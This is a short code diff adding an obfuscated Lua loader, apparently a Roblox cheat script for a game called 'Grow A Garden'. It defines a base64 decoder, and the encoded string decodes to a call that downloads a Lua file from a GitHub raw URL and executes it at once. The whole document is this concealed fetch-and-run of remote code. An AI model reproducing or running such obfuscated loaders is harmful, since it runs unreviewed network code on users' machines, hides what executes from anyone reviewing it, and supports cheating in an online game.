@@ -1,2 +1,3 @@
--- Obfuscated Script
-bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9XQ0RldmVsb3BtZW50cy9XQ0RldnMvcmVmcy9oZWFkcy9tYWluL0dyb3clMjBBJTIwR2FyZGVuL3N0b2NrZWRzZWVkcy5sdWEnKSkoKQ==
+
+local decode=function(e)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';e=e:gsub('[^'..b..'=]','');return(e:gsub('.',function(x)if(x=='=')then return''end;local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end;return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if(#x~=8)then return''end;local c=0;for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end;return string.char(c)end))end;
+loadstring(decode("bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9XQ0RldmVsb3BtZW50cy9XQ0RldnMvcmVmcy9oZWFkcy9tYWluL0dyb3clMjBBJTIwR2FyZGVuL3N0b2NrZWRzZWVkcy5sdWEnKSkoKQ=="))()
